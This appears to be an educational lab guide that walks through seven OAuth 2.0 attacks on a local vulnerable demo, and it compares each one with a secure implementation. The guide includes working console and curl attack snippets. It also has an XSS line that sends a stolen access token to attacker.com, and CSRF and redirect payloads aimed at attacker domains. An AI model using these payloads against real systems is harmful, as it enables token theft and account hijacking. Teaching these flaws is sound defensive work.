# 🔴 Manual Attack Demonstration Guide

This guide walks you through testing all vulnerability scenarios step-by-step using your browser.

## Prerequisites

Make sure all servers are running:
- ✅ Vulnerable Auth Server: http://localhost:4000
- ✅ Vulnerable Client App: http://localhost:3000

Test credentials:
- Username: `demo`
- Password: `password123`

---

## 🔴 Scenario 1: Authorization Code Interception Attack

### Vulnerability: Authorization code visible in URL

**Steps to reproduce:**

1. **Open vulnerable client**: http://localhost:3000

2. **Open Browser DevTools** (F12 or Right-click → Inspect)
   - Go to the **Console** tab
   - Keep it open during the entire flow

3. **Click "Login with OAuth 2.0"**

4. **Login** with:
   - Username: `demo`
   - Password: `password123`

5. **Click "Approve"** to authorize the application

6. **🚨 OBSERVE THE ATTACK:**
   - Look at your browser's **address bar** after redirect
   - You'll see: `http://localhost:3000/callback?code=XXXX...`
   - **The authorization code is visible in the URL!**

7. **Check browser console:**
   - You'll see logs like:
     ```
     [VULN] Authorization code received: abc123...
     [VULN] Exchanging code for token...
     [VULN] Access token received: xyz789...
     ```

8. **Check browser history** (Ctrl+H):
   - The authorization code is permanently stored in history
   - Can be accessed by malware, other users, or forensics tools

### ⚠️ Attack Impact:
- ✗ Authorization code exposed in multiple places:
  - Browser address bar (user can see it)
  - Browser history (persisted)
  - Server logs (Referer header)
  - Network monitoring tools
  - Proxy logs
- ✗ Without PKCE, anyone with this code can exchange it for an access token
- ✗ Code doesn't expire quickly
- ✗ No binding between client and authorization request

### ✅ Secure Version Comparison:
Visit http://localhost:3001 and repeat the flow:
- Code is sent to server via query parameter but immediately extracted
- Code is never exposed to client-side JavaScript
- PKCE ensures only the client with code_verifier can use it

---

## 🔴 Scenario 2: Token Theft from localStorage

### Vulnerability: Access tokens stored in browser localStorage

**Steps to reproduce:**

1. **Complete OAuth login** on http://localhost:3000 (see Scenario 1)

2. **Open Browser DevTools Console** (F12)

3. **Run this command:**
   ```javascript
   localStorage.getItem('access_token')
   ```

4. **🚨 OBSERVE THE ATTACK:**
   - The access token is returned in plain text!
   - Example: `"a8f7g9h2j4k5l6m8n9p0q1r2s3t4u5v6w7x8y9z0"`

5. **Access all localStorage data:**
   ```javascript
   console.log(localStorage)
   ```

6. **See the user info:**
   ```javascript
   localStorage.getItem('user_info')
   ```

7. **Try using the stolen token manually:**
   ```javascript
   fetch('http://localhost:4000/userinfo', {
     headers: { 'Authorization': 'Bearer ' + localStorage.getItem('access_token') }
   })
   .then(r => r.json())
   .then(data => console.log('Stolen user data:', data))
   ```

### ⚠️ Attack Impact:
- ✗ **XSS attacks** can steal tokens:
  ```javascript
  // Malicious script injected via XSS
  fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'))
  ```
- ✗ **Malicious browser extensions** can access localStorage
- ✗ Tokens **persist** even after closing browser
- ✗ **No HttpOnly** protection (unlike cookies)
- ✗ Accessible to **any JavaScript** running on the page

### ✅ Secure Version Comparison:
Visit http://localhost:3001 and complete login:
```javascript
localStorage.getItem('access_token')
// Returns: null
```
- Tokens stored server-side in session
- Only session ID cookie sent to browser (HttpOnly)
- JavaScript cannot access tokens

---

## 🔴 Scenario 3: CSRF Attack - No State Parameter

### Vulnerability: Missing state parameter allows CSRF

**Steps to reproduce:**

1. **Login to auth server** (to have a valid session):
   - Go to http://localhost:4000/login
   - Login with demo/password123
   - Keep this tab open

2. **Simulate attacker's malicious page**:
   - Open a new tab
   - Open **DevTools Console**
   - Paste this code:

   ```javascript
   // Attacker's malicious OAuth URL (no state parameter)
   const maliciousUrl = 'http://localhost:4000/authorize?' +
     'response_type=code&' +
     'client_id=vulnerable-client-app&' +
     'redirect_uri=http://attacker-site.com/steal';
   
   console.log('Malicious OAuth URL:', maliciousUrl);
   console.log('If user clicks this, authorization code goes to attacker!');
   
   // In real attack, this would be on attacker's website
   // <a href="...">Click here to win a prize!</a>
   ```

3. **🚨 OBSERVE THE ATTACK:**
   - The authorization URL has NO `state` parameter
   - Server accepts it without requiring state
   - If victim clicks "Approve", code goes to attacker's redirect_uri

4. **Check the auth server response:**
   - Visit the malicious URL (carefully)
   - Notice the warning: "No state parameter provided - CSRF protection missing!"
   - Server still processes the request

5. **Real-world CSRF scenario:**
   ```html
   <!-- Attacker's malicious website -->
   <img src="http://localhost:4000/authorize?
     response_type=code&
     client_id=vulnerable-client-app&
     redirect_uri=http://attacker.com/steal">
   
   <!-- User visits attacker's site while logged into OAuth server -->
   <!-- Browser automatically sends session cookies -->
   <!-- User unknowingly authorizes attacker's app -->
   ```

### ⚠️ Attack Impact:
- ✗ Attacker can trick victims into authorizing attacker's application
- ✗ No way to verify the request originated from legitimate client
- ✗ Session riding attack possible
- ✗ Authorization code sent to attacker's redirect_uri

### ✅ Secure Version Comparison:
Try http://localhost:3001 - every request includes a state parameter:
- State generated by client before redirect
- Validated after callback
- CSRF attacks prevented

---

## 🔴 Scenario 4: Open Redirect Vulnerability

### Vulnerability: Weak redirect_uri validation

**Steps to reproduce:**

1. **Login to auth server** at http://localhost:4000/login

2. **Try a malicious redirect_uri**:
   - Open **DevTools Network tab**
   - Visit this URL:
   ```
   http://localhost:4000/authorize?response_type=code&client_id=vulnerable-client-app&redirect_uri=http://evil-attacker.com/steal
   ```

3. **Click "Approve"**

4. **🚨 OBSERVE THE ATTACK:**
   - Check the **Network tab** for redirect
   - Or check the authorization consent page
   - Notice: Server shows the evil redirect_uri
   - If approved, authorization code would go to attacker's domain

5. **Try different malicious URIs:**
   ```
   http://localhost:4000/authorize?...&redirect_uri=https://attacker.com
   http://localhost:4000/authorize?...&redirect_uri=http://localhost:3000.attacker.com
   http://localhost:4000/authorize?...&redirect_uri=http://localhost:3000@attacker.com
   ```

6. **Check server logs** (look at the terminal running auth server):
   - You'll see warnings about missing validation
   - But server still accepts the request!

### ⚠️ Attack Impact:
- ✗ Authorization code sent to attacker's domain
- ✗ No whitelist validation of redirect URIs
- ✗ Phishing attacks possible
- ✗ Attacker can impersonate legitimate client

### ✅ Secure Version Comparison:
Try http://localhost:4001 with malicious redirect_uri:
- Server validates against whitelist
- Only exact matches allowed
- Malicious redirects rejected with 400 error

---

## 🔴 Scenario 5: Token Replay & Code Reuse

### Vulnerability: Authorization codes can be reused

**Steps to reproduce:**

1. **Complete one full OAuth flow** on http://localhost:3000

2. **Capture the authorization code**:
   - Look at the URL after authorization: `http://localhost:3000/callback?code=XXX`
   - Copy the code value

3. **Open a new browser tab / Incognito window**

4. **Use cURL to reuse the code:**
   ```bash
   curl -X POST http://localhost:4000/token \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "grant_type=authorization_code" \
     -d "code=PASTE_CODE_HERE" \
     -d "client_id=vulnerable-client-app" \
     -d "redirect_uri=http://localhost:3000/callback"
   ```

5. **🚨 OBSERVE THE ATTACK:**
   - You might get another access token!
   - Code should have been invalidated after first use
   - No single-use enforcement

6. **Test with browser DevTools:**
   ```javascript
   // After completing OAuth flow once
   const stolenCode = 'CODE_FROM_URL';
   
   fetch('http://localhost:4000/token', {
     method: 'POST',
     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
     body: new URLSearchParams({
       grant_type: 'authorization_code',
       code: stolenCode,
       client_id: 'vulnerable-client-app',
       redirect_uri: 'http://localhost:3000/callback'
     })
   })
   .then(r => r.json())
   .then(data => console.log('Replay result:', data));
   ```

### ⚠️ Attack Impact:
- ✗ Authorization codes don't expire quickly
- ✗ Codes can potentially be reused
- ✗ Intercepted codes remain valid
- ✗ Race condition attacks possible

### ✅ Secure Version Comparison:
Secure server (http://localhost:4001):
- Codes are single-use only
- Second use returns error
- Codes expire after 10 minutes

---

## 🔴 Scenario 6: No PKCE Validation

### Vulnerability: PKCE parameters ignored

**Steps to reproduce:**

1. **Start OAuth flow** on http://localhost:3000

2. **Intercept the authorization request**:
   - Open **DevTools Network tab**
   - Click "Login with OAuth 2.0"
   - Find the request to `/authorize`
   - Look at the query parameters

3. **🚨 OBSERVE:**
   - Notice: **NO** `code_challenge` parameter!
   - Vulnerable client doesn't even send PKCE parameters
   - Even if it did, server wouldn't validate them

4. **Manual test with PKCE parameters:**
   ```bash
   # Try sending PKCE parameters
   curl "http://localhost:4000/authorize?response_type=code&client_id=vulnerable-client-app&redirect_uri=http://localhost:3000/callback&code_challenge=fake_challenge&code_challenge_method=S256" \
     -c /tmp/cookies.txt
   
   # Server accepts it but doesn't validate!
   ```

5. **Check authorization consent page**:
   - Warning shows: "PKCE parameters present but NOT validated by server"
   - Server completely ignores PKCE

### ⚠️ Attack Impact:
- ✗ Authorization code interception is trivial
- ✗ No proof-of-possession required
- ✗ Anyone with code can exchange it for token
- ✗ Defeats the purpose of PKCE

### ✅ Secure Version Comparison:
Secure implementation (http://localhost:3001):
- Client generates code_verifier and code_challenge
- Server requires PKCE parameters
- Token exchange validates code_verifier matches code_challenge
- Only original client can use the code

---

## 🔴 Scenario 7: Sensitive Data in Console Logs

### Vulnerability: Sensitive data logged everywhere

**Steps to reproduce:**

1. **Open DevTools Console** on http://localhost:3000

2. **Complete OAuth flow**

3. **🚨 OBSERVE in Browser Console:**
   ```
   [VULN] Authorization code received: abc123def456...
   [VULN] Exchanging code for token...
   [VULN] Access token received: xyz789uvw456...
   [VULN] User info: {"sub":"demo","username":"demo",...}
   ```

4. **Check Server Console** (terminal running auth server):
   ```
   [DEBUG] Authorization request received {...}
   [DEBUG] User logged in { username: 'demo', password: 'password123', sessionId: '...' }
   [DEBUG] Authorization code generated: abc123...
   [DEBUG] Token exchange request {...}
   [DEBUG] Access token issued: xyz789...
   ```

5. **Security implications:**
   - All sensitive data visible in logs
   - Logs often stored/aggregated
   - Operations teams have access
   - Log files can be compromised
   - Compliance violations (PCI-DSS, GDPR)

### ⚠️ Attack Impact:
- ✗ Passwords logged in plain text
- ✗ Tokens logged and potentially stored
- ✗ Session IDs exposed
- ✗ Authorization codes visible
- ✗ User data logged unnecessarily

### ✅ Secure Version Comparison:
Check secure server logs (http://localhost:4001):
- Passwords never logged
- Tokens shown as `[REDACTED]`
- Only safe metadata logged
- Production-ready logging practices

---

## 📊 Complete Vulnerability Summary

After testing all scenarios, you've confirmed:

| # | Vulnerability | Impact | Severity |
|---|--------------|---------|----------|
| 1 | Authorization code in URL | Code interception | 🔴 CRITICAL |
| 2 | localStorage token storage | XSS token theft | 🔴 CRITICAL |
| 3 | No state parameter | CSRF attacks | 🔴 CRITICAL |
| 4 | Weak redirect_uri validation | Open redirect | 🔴 CRITICAL |
| 5 | No PKCE validation | Code interception | 🔴 CRITICAL |
| 6 | Client-side token exchange | Code theft | 🟠 HIGH |
| 7 | Code reuse possible | Replay attacks | 🟠 HIGH |
| 8 | No token expiration | Long-lived tokens | 🟠 HIGH |
| 9 | Sensitive data in logs | Data exposure | 🟡 MEDIUM |
| 10 | Plain text passwords | Credential theft | 🔴 CRITICAL |

---

## 🎯 Next Steps

1. **Compare with Secure Version:**
   - Visit http://localhost:3001
   - Complete OAuth flow
   - Try the same attacks
   - See how each is prevented

2. **Read Attack Scenarios:**
   - See `ATTACK_SCENARIOS.md` for detailed attack chains
   - Learn how these vulnerabilities are exploited in the wild

3. **Review Source Code:**
   - Compare `auth-server-vulnerable/server.js` vs `auth-server-secure/server.js`
   - Look for inline comments marking vulnerabilities
   - Understand the security fixes

4. **Practice:**
   - Try combining multiple vulnerabilities
   - Think of creative attack scenarios
   - Document what you learn

---

## ⚠️ Important Reminder

This vulnerable implementation is for **EDUCATIONAL PURPOSES ONLY**.

**NEVER** deploy code like this in production!

For production OAuth 2.0 implementations:
- Use established libraries (Passport.js, OAuth2orize)
- Follow RFC 7636 (PKCE) strictly
- Implement proper security headers
- Use HTTPS always
- Add rate limiting
- Monitor for suspicious activity
- Conduct security audits
